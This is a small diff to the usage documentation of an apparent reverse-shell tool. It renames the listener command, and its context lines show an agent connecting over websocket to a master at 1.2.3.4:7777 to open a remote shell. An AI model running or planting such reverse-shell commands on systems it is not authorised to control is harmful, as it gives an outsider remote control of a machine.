@@ -14,7 +14,7 @@ reverse-shell-agent websocket [flags]
 
 ```
 # On the master (1.2.3.4)
-$ reverse-shell-master listen --port 7777
+$ reverse-shell-client listen --port 7777
 
 # On the agent
 $ reverse-shell-agent websocket --url http://1.2.3.4:7777
